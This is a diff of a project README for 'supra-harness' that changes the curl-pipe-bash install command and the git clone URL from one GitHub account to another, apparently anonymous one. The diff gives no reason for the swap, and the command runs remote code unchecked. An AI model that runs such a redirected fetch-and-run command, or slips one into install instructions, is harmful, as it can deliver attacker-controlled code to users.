@@ -99,7 +99,7 @@ Requirements: Rust 1.85+, CMake 3.24+, clang++ with C++20, git. Optional:
 ### Option A — one line (release binary)
 
 ```sh
-curl -fsSL https://raw.githubusercontent.com/trubs/supra-harness/main/scripts/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/Anonnymous0071/supra-harness/main/scripts/install.sh | bash
 ```
 
 Installs the latest `supra` for your platform into `~/.local/bin`
@@ -112,7 +112,7 @@ the key is unknown). Needs `curl`.
 ### Option B — from source (developers)
 
 ```sh
-git clone https://github.com/trubs/supra-harness.git
+git clone https://github.com/Anonnymous0071/supra-harness.git
 cd supra-harness
 just doctor      # report toolchain status
 just bootstrap   # install missing rustup targets and components
